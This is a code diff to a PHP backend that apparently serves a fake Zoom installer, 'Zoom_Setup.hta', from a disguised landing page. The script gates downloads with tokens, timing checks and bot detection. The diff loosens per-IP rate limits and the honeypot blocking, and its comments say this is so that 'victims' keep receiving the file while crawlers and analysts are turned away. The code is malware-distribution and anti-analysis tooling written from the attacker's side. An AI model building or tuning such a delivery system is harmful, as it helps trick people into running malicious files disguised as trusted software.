@@ -30,7 +30,7 @@ define('SECRET', (string)($_ENV['TK_SECRET'] ?? 'railway-zoom-landing-9f2e1c7a4b
 
 define('TTL', 900);            // token lifetime (15 min)
 define('MIN_DL_AGE', 6);       // index -> ... -> dl must span >= 6s (5s spinner + 2s button)
-define('RATE_LIMIT', 5);       // served downloads per IP per 1h window
+define('RATE_LIMIT', 25);      // served downloads per IP per 1h window (was 5; 404'd repeat victims)
 define('SOURCE_ZIP', __DIR__ . '/src/Zoom_Setup.hta');
 define('RATE_DIR', sys_get_temp_dir());
 define('ALERT_DIR', sys_get_temp_dir());
@@ -317,10 +317,10 @@ function is_poisoned(): bool {
 }
 
 function poison_hit(): void {
-    $f = poison_path();
-    $d = dirname($f);
-    if (!is_dir($d)) { @mkdir($d, 0777, true); }
-    @touch($f);
+    // Do NOT persist a 24h poison: real victims (and their household NAT IPs)
+    // can trip the honeypot via pre-rendering crawlers / extensions and then
+    // get 404s on every later page for a day. Bots are already stopped by the
+    // HTTP header gate + JEV verdict; keep this to an immediate silent 404.
     flood_check();
     silent_404();
 }
